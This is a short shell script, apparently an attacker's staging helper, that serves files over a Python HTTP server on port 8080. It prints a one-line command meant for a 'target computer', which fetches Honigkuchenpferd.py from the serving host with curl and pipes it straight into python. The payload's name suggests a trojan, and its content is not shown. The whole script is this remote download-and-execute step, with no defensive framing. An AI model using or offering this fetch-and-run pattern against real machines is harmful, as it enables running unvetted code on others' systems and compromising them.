#!/usr/bin/sh

IP="192.168.1.x"
PORT="8080"
echo "run on target computer:"
echo "curl -s http://$IP:$PORT/Honigkuchenpferd.py | /usr/bin/python"
echo ""
/bin/python3 -m http.server $PORT
